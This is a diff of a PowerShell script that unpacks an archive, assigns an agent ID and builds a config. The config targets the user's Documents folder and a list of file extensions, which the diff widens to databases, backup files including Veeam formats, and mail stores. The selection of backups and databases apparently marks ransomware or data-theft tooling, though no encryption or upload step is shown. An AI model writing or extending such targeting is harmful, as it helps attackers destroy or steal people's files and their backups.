@@ -11,10 +11,7 @@ Expand-Archive -Path $zip -DestinationPath $dir -Force
 Remove-Item $zip -Force
 
 if (Test-Path $cfg) {
-    try {
-        $existing = Get-Content $cfg -Raw | ConvertFrom-Json
-        $agentId = $existing.AgentId
-    } catch { $agentId = $null }
+    try { $existing = Get-Content $cfg -Raw | ConvertFrom-Json; $agentId = $existing.AgentId } catch { $agentId = $null }
 }
 if (-not $agentId) { $agentId = [guid]::NewGuid().ToString() }
 
@@ -25,8 +22,12 @@ $configObj = @{
         "C:\Users\$env:USERNAME\Documents"
     )
     TargetExtensions = @(
-        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
-        ".pdf", ".txt", ".csv", ".zip", ".rar", ".jpg", ".jpeg", ".png"
+        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods", ".odp", ".rtf",
+        ".pdf", ".txt", ".csv",
+        ".sql", ".mdf", ".ldf", ".frm", ".myd", ".myi", ".ibd", ".dump", ".db", ".sqlite", ".sqlite3",
+        ".bak", ".bkp", ".bkf", ".backup", ".vbk", ".vbm", ".vib",
+        ".pst", ".ost", ".msg", ".eml",
+        ".jpg", ".jpeg", ".png", ".zip", ".rar"
     )
 }
 
